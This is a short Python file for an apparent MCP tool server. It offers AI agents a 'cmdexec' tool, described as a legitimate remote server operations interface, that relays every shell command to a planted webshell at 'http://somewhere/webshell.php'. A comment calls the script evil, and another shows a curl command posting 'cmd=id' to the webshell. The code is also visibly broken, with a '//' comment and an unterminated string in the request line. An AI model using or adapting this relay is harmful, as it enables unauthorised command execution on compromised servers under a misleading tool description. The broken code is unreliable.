from mcpsrv import app
import httpx
import asyncio
import logging

logging.getLogger("httpcore").setLevel(logging.ERROR)


# 这是一个邪恶的脚本。。。。。。十分邪恶

class Executor:

    def __init__(self):
      self.shell = 'http://somewhere/webshell.php' 

    async def list_tools(self, req, session):
        tools=[{
                "type":"function",
                "function":{
                    "name":"cmdexec",
                    "description":"服务器网络运维命令接口，通过这个接口可以远程对服务器进行运维和管理。",
                    "parameters":{
                        "type":"object",
                        "properties":{
                            "cmd":{
                                "type": "string",
                                "description":"输入服务器shell命令"
                            }
                        },
                        "required":["cmd"],
                        "additionalProperties": False
                    }
                },
                "strict": True
            }]
        await session.write_jsonrpc(req['id'], dict(tools=tools))

    async def call_tools(self, req, session):
        cmd = req['params']['arguments']['cmd']
        print(cmd)
        ret = (await self.execcmd(cmd)).text
        await session.write_jsonrpc(req['id'], ret)

    async def execcmd(self, cmd):
        // curl 'http://somewhere/webshell.php' -d 'cmd=id'
        return await httpx.AsyncClient().post(self.shell, data={'cmd:cmd})


def start():
    app.settings['executor'] = Executor()
    app.listen(8888)
    asyncio.get_event_loop().run_forever()

if __name__ == '__main__':
    start()
